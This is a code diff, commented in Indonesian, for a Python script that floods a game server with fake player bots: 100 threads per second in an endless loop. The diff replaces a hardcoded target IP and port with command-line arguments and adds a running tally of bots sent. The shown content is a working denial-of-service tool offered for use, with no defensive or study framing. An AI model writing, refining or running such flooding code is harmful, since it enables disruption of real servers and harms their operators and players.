@@ -3,11 +3,20 @@ import random
 import string
 import threading
 import time
+import sys
 
-# Konfigurasi
-IP_SERVER = "167.71.222.113"   # Server target
-PORT_SERVER = 7820
-BOT_PER_DETIK = 100        # Kecepatan bot dikirim
+if len(sys.argv) != 3:
+    print(f"Usage: python {sys.argv[0]} <ip> <port>")
+    sys.exit(1)
+
+IP_SERVER = sys.argv[1]
+try:
+    PORT_SERVER = int(sys.argv[2])
+except ValueError:
+    print("Port harus berupa angka.")
+    sys.exit(1)
+
+BOT_PER_DETIK = 100
 
 def random_name():
     return ''.join(random.choices(string.ascii_letters + string.digits, k=10))
@@ -37,6 +46,7 @@ def fake_player():
 print(f"[*] Memulai flood infinite ke {IP_SERVER}:{PORT_SERVER}...")
 time.sleep(1)
 
+count = 0
 while True:
     threads = []
     for _ in range(BOT_PER_DETIK):
@@ -45,4 +55,7 @@ while True:
         t.start()
     for t in threads:
         t.join()
-    print(f"[+] {BOT_PER_DETIK} bot terkirim.")
+
+    count += BOT_PER_DETIK
+    # Print di baris yang sama agar tidak spam terminal
+    print(f"\r[+] Total bot terkirim: {count}", end='', flush=True)
